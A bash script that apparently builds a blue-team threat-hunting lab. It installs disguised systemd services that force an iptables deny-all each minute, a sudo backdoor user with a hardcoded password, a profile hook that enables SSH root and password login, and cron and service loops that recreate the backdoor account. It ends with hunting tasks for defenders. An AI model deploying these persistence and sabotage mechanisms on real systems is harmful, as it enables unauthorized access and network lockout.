#!/bin/bash
#
# Simplified Threat Hunting Training Environment
# WARNING: This script is for CLOSED TEST ENVIRONMENTS ONLY
#

set -e

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root (use sudo)" 
   exit 1
fi

echo "[*] Starting threat hunting environment deployment..."

# ============================================================================
# PART 1: Deploy "DomainNameServix" Service with Firewall Manipulation
# ============================================================================
echo "[+] Creating DomainNameServix service..."

# Create the service script that sets iptables deny all every 1 minute
cat > /usr/local/bin/domainnameservix.sh << 'EOF'
#!/bin/bash
while true; do
    # Set iptables to deny all
    iptables -F
    iptables -X
    iptables -P INPUT DROP
    iptables -P FORWARD DROP
    iptables -P OUTPUT DROP
    
    # Wait 1 minute
    sleep 60
done
EOF

chmod +x /usr/local/bin/domainnameservix.sh

# Create systemd service
cat > /etc/systemd/system/domainnameservix.service << 'EOF'
[Unit]
Description=Domain Name Servix
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/domainnameservix.sh
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl daemon-reload
systemctl enable domainnameservix.service
systemctl start domainnameservix.service

echo "[+] DomainNameServix deployed and started (setting firewall deny all every 1 minute)"

# ============================================================================
# PART 2: Create Kayne1 User with Sudo Access
# ============================================================================
echo "[+] Creating Kayne1 user with sudo privileges..."

USERNAME="Kayne1"

# Create user if doesn't exist
if ! id "$USERNAME" &>/dev/null; then
    useradd -m -s /bin/bash "$USERNAME"
    echo "$USERNAME:Training123!" | chpasswd
    
    # Add to sudo/wheel group
    if getent group sudo &>/dev/null; then
        usermod -aG sudo "$USERNAME"
    elif getent group wheel &>/dev/null; then
        usermod -aG wheel "$USERNAME"
    fi
    
    echo "[+] Created user: $USERNAME (password: Training123!)"
else
    echo "[!] User $USERNAME already exists"
fi

# ============================================================================
# PART 3: SSH Persistence via Profile Script
# ============================================================================
echo "[+] Creating SSH persistence mechanism..."

# Create the SSH reconfiguration script
cat > /usr/local/bin/ssh-reconfig.sh << 'EOF'
#!/bin/bash

# Reinstall SSH (distro-agnostic approach)
if command -v apt-get &> /dev/null; then
    apt-get install --reinstall -y openssh-server
elif command -v yum &> /dev/null; then
    yum reinstall -y openssh-server
elif command -v dnf &> /dev/null; then
    dnf reinstall -y openssh-server
fi

# Backup original config
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak.$(date +%s)

# Configure SSH to allow root login only
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Ensure it's in the config if not present
grep -q "^PermitRootLogin" /etc/ssh/sshd_config || echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

# Restart SSH service
systemctl restart sshd || systemctl restart ssh

# Remove this script from profile after execution
sed -i '/ssh-reconfig.sh/d' /etc/profile
EOF

chmod +x /usr/local/bin/ssh-reconfig.sh

# Add to /etc/profile for execution on next boot
echo "[ -x /usr/local/bin/ssh-reconfig.sh ] && /usr/local/bin/ssh-reconfig.sh &" >> /etc/profile

echo "[+] SSH persistence mechanism installed (will activate on reboot)"

# ============================================================================
# PART 4: Cron Job for Kayne1 User Persistence
# ============================================================================
echo "[+] Creating cron job for Kayne1 persistence..."

# Create the user check script
cat > /usr/local/bin/ensure-kayne1.sh << 'EOF'
#!/bin/bash

USERNAME="Kayne1"

# Check if user exists
if ! id "$USERNAME" &>/dev/null; then
    # User doesn't exist, recreate them
    useradd -m -s /bin/bash "$USERNAME"
    echo "$USERNAME:Training123!" | chpasswd
    
    # Add to sudo/wheel group
    if getent group sudo &>/dev/null; then
        usermod -aG sudo "$USERNAME"
    elif getent group wheel &>/dev/null; then
        usermod -aG wheel "$USERNAME"
    fi
    
    logger "Kayne1 user recreated by persistence script"
fi
EOF

chmod +x /usr/local/bin/ensure-kayne1.sh

# Add cron job to run every 5 minutes
(crontab -l 2>/dev/null | grep -v ensure-kayne1.sh; echo "*/5 * * * * /usr/local/bin/ensure-kayne1.sh") | crontab -

echo "[+] Cron job installed (checks every 5 minutes)"

# ============================================================================
# PART 5: Module Creation Subset Service for Kayne1 Persistence
# ============================================================================
echo "[+] Creating module-creation-subset-service..."

# Create the service script
cat > /usr/local/bin/module-creation-subset.sh << 'EOF'
#!/bin/bash

USERNAME="Kayne1"

while true; do
    # Check if user exists
    if ! id "$USERNAME" &>/dev/null; then
        # User doesn't exist, recreate them
        useradd -m -s /bin/bash "$USERNAME"
        echo "$USERNAME:Training123!" | chpasswd
        
        # Add to sudo/wheel group
        if getent group sudo &>/dev/null; then
            usermod -aG sudo "$USERNAME"
        elif getent group wheel &>/dev/null; then
            usermod -aG wheel "$USERNAME"
        fi
        
        logger "Kayne1 user recreated by module-creation-subset-service"
    fi
    
    # Check every 2 minutes
    sleep 120
done
EOF

chmod +x /usr/local/bin/module-creation-subset.sh

# Create systemd service
cat > /etc/systemd/system/module-creation-subset.service << 'EOF'
[Unit]
Description=Module Creation Subset Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/module-creation-subset.sh
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl daemon-reload
systemctl enable module-creation-subset.service
systemctl start module-creation-subset.service

echo "[+] Module Creation Subset Service deployed and started"

# ============================================================================
# Summary
# ============================================================================
echo ""
echo "============================================================================"
echo "THREAT HUNTING ENVIRONMENT DEPLOYMENT COMPLETE"
echo "============================================================================"
echo ""
echo "Deployed Components:"
echo "  1. DomainNameServix (systemd service)"
echo "     - Sets iptables DENY ALL every 1 minute"
echo "     - Running at: /usr/local/bin/domainnameservix.sh"
echo "     - WARNING: This WILL lock down the firewall!"
echo ""
echo "  2. Kayne1 User (sudo privileges)"
echo "     - Username: Kayne1"
echo "     - Password: Training123!"
echo ""
echo "  3. SSH Persistence (profile script)"
echo "     - Will reconfigure SSH on next reboot"
echo "     - Script at: /usr/local/bin/ssh-reconfig.sh"
echo ""
echo "  4. Kayne1 Persistence - Cron Job"
echo "     - Checks every 5 minutes if Kayne1 exists"
echo "     - Recreates user if deleted"
echo "     - Script at: /usr/local/bin/ensure-kayne1.sh"
echo ""
echo "  5. Kayne1 Persistence - Service"
echo "     - module-creation-subset.service"
echo "     - Checks every 2 minutes if Kayne1 exists"
echo "     - Recreates user if deleted"
echo ""
echo "============================================================================"
echo "BLUE TEAM HUNTING TASKS:"
echo "============================================================================"
echo "  - Find the firewall manipulation service"
echo "  - Locate the persistent backdoor user (Kayne1)"
echo "  - Identify ALL persistence mechanisms (cron + service)"
echo "  - Discover the SSH persistence in profile"
echo "  - Try to remove Kayne1 and see what happens!"
echo "============================================================================"
echo ""
echo "To disable firewall lockdown: systemctl disable domainnameservix.service && systemctl stop domainnameservix.service"
echo "To remove Kayne1 persistence: systemctl disable module-creation-subset.service && crontab -r"
echo ""
